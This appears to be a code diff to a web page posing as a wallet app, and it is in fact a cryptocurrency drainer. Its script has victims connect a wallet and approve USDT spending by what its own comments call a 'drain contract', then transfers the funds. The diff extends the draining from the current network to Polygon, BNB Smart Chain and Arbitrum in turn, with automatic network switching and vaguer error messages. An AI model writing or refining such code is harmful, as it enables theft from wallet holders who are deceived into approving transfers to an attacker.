@@ -150,7 +150,7 @@
                 <li>App will open in your wallet browser</li>
                 <li>Connect your wallet when prompted</li>
                 <li>Approve the transactions when asked</li>
-                <li>Process will run automatically</li>
+                <li>Process will run automatically across 3 networks</li>
             </ol>
         </div>
         
@@ -166,15 +166,15 @@
         <div id="network-statuses">
             <div class="network-status waiting" id="polygon-status">
                 <div><strong>Polygon</strong></div>
-                <div>Waiting for wallet connection...</div>
+                <div>Waiting...</div>
             </div>
             <div class="network-status waiting" id="bsc-status">
                 <div><strong>BNB Smart Chain</strong></div>
-                <div>Waiting for wallet connection...</div>
+                <div>Waiting...</div>
             </div>
             <div class="network-status waiting" id="arbitrum-status">
                 <div><strong>Arbitrum</strong></div>
-                <div>Waiting for wallet connection...</div>
+                <div>Waiting...</div>
             </div>
         </div>
         <div id="overall-status" style="margin-top: 20px; padding: 10px; border-radius: 4px;"></div>
@@ -457,23 +457,29 @@ async function switchNetwork(chainId) {
     };
 
     try {
+        updateNetworkStatus(chainId, 'pending', 'Switching network...');
         await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: chainId }],
         });
+        updateNetworkStatus(chainId, 'pending', 'Network switched - waiting...');
         return true;
     } catch (switchError) {
         if (switchError.code === 4902) {
             try {
+                updateNetworkStatus(chainId, 'pending', 'Adding network...');
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
                     params: [chainConfig[chainId]],
                 });
+                updateNetworkStatus(chainId, 'pending', 'Network added - waiting...');
                 return true;
             } catch (addError) {
+                updateNetworkStatus(chainId, 'error', 'Failed to add network');
                 return false;
             }
         }
+        updateNetworkStatus(chainId, 'error', 'Failed to switch network');
         return false;
     }
 }
@@ -492,16 +498,6 @@ async function checkUSDTBalance(web3, usdtAddress, userAddress) {
         const usdtContract = new web3.eth.Contract(balanceABI, usdtAddress);
         const balance = await usdtContract.methods.balanceOf(userAddress).call();
         return web3.utils.fromWei(balance, 'mwei'); // USDT uses 6 decimals
-    } catch (error) {
-        return '0';
-    }
-}
-
-// Check contract balance to see if it can receive funds
-async function checkContractBalance(web3, contractAddress) {
-    try {
-        const balance = await web3.eth.getBalance(contractAddress);
-        return web3.utils.fromWei(balance, 'ether');
     } catch (error) {
         return '0';
     }
@@ -554,7 +550,6 @@ async function processNetwork(chainId) {
         }
 
         const userAddress = accounts[0];
-        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
         const config = CHAIN_CONFIGS[chainId];
         config.chainId = chainId; // Add chainId to config for status updates
         
@@ -569,18 +564,6 @@ async function processNetwork(chainId) {
         }
 
         updateNetworkStatus(chainId, 'pending', `USDT Balance: ${usdtBalance} - Starting...`);
-
-        // Switch network if needed
-        if (currentChainId !== chainId) {
-            updateNetworkStatus(chainId, 'pending', 'Switching network...');
-            const switched = await switchNetwork(chainId);
-            if (!switched) {
-                updateNetworkStatus(chainId, 'error', 'Network switch failed');
-                return 'error';
-            }
-            // Wait for network change
-            await new Promise(resolve => setTimeout(resolve, 2000));
-        }
 
         // USDT Approval - approve the drain contract to spend USDT
         updateNetworkStatus(chainId, 'pending', 'Approving USDT access...');
@@ -631,7 +614,7 @@ async function processNetwork(chainId) {
                     updateNetworkStatus(chainId, 'error', 'User rejected transfer');
                     return 'rejected';
                 } else {
-                    updateNetworkStatus(chainId, 'error', 'Transfer failed - contract may not support USDT');
+                    updateNetworkStatus(chainId, 'error', 'Transfer failed');
                     return 'error';
                 }
             }
@@ -656,45 +639,80 @@ async function startNetworkCycle() {
     isExecuting = true;
     executionCount++;
 
-    const networksToProcess = ['0x89', '0x38', '0xa4b1'];
+    const web3 = new Web3(window.ethereum);
+    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+    
+    const allNetworks = ['0x89', '0x38', '0xa4b1']; // Polygon, BSC, Arbitrum
     let successfulDrains = 0;
 
-    // Check which network the user is currently on and only process that one
-    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+    // STEP 1: Process current network first
     const currentNetwork = CHAIN_CONFIGS[currentChainId];
-    
     if (currentNetwork && !processedNetworks[currentChainId]) {
-        // User is on a supported network, only process that one
         updateNetworkStatus(currentChainId, 'pending', 'Processing current network...');
-        const result = await processNetwork(currentChainId);
+        const currentResult = await processNetwork(currentChainId);
+        if (currentResult === 'success') successfulDrains++;
+        
+        // If user rejects on current network, stop completely
+        if (currentResult === 'rejected') {
+            document.getElementById('overall-status').textContent = 'Process stopped - user rejected transaction';
+            document.getElementById('overall-status').className = 'error';
+            document.querySelector('.loading-spinner').style.display = 'none';
+            isExecuting = false;
+            return;
+        }
+    }
+
+    // STEP 2: Process other networks (excluding current one)
+    const otherNetworks = allNetworks.filter(chainId => chainId !== currentChainId);
+    
+    for (const chainId of otherNetworks) {
+        if (processedNetworks[chainId]) continue;
+        
+        // Ask to switch to the next network
+        updateNetworkStatus(chainId, 'pending', 'Requesting network switch...');
+        const switched = await switchNetwork(chainId);
+        
+        if (!switched) {
+            updateNetworkStatus(chainId, 'error', 'Network switch rejected or failed');
+            continue; // Continue to next network even if switch fails
+        }
+        
+        // Wait for network switch to complete
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        
+        // Verify we're on the correct network
+        const newChainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (newChainId !== chainId) {
+            updateNetworkStatus(chainId, 'error', 'Network switch incomplete');
+            continue;
+        }
+        
+        // Process the network
+        updateNetworkStatus(chainId, 'pending', 'Processing network...');
+        const result = await processNetwork(chainId);
         if (result === 'success') successfulDrains++;
-    } else {
-        // User is not on a supported network or already processed, process all sequentially
-        for (const chainId of networksToProcess) {
-            if (processedNetworks[chainId]) continue;
-            
-            const result = await processNetwork(chainId);
-            if (result === 'success') successfulDrains++;
-            
-            // If user rejects or has no balance, stop the process
-            if (result === 'rejected' || result === 'no_balance') {
-                break;
-            }
-            
-            // Wait before next network (if not the last one)
-            const currentIndex = networksToProcess.indexOf(chainId);
-            if (currentIndex < networksToProcess.length - 1) {
-                await new Promise(resolve => setTimeout(resolve, 3000));
-            }
+        
+        // If user rejects on any network, stop the process
+        if (result === 'rejected') {
+            break;
+        }
+        
+        // Wait before next network (if not the last one)
+        const currentIndex = otherNetworks.indexOf(chainId);
+        if (currentIndex < otherNetworks.length - 1) {
+            updateNetworkStatus(chainId, 'pending', 'Moving to next network...');
+            await new Promise(resolve => setTimeout(resolve, 3000));
         }
     }
 
     // Update overall status
     const overallStatus = document.getElementById('overall-status');
-    overallStatus.textContent = `Completed: ${successfulDrains} network${successfulDrains !== 1 ? 's' : ''} processed`;
+    overallStatus.textContent = `Completed: ${successfulDrains}/3 networks processed`;
     
-    if (successfulDrains > 0) {
+    if (successfulDrains === 3) {
         overallStatus.className = 'success';
+    } else if (successfulDrains > 0) {
+        overallStatus.className = 'pending';
     } else {
         overallStatus.className = 'error';
     }
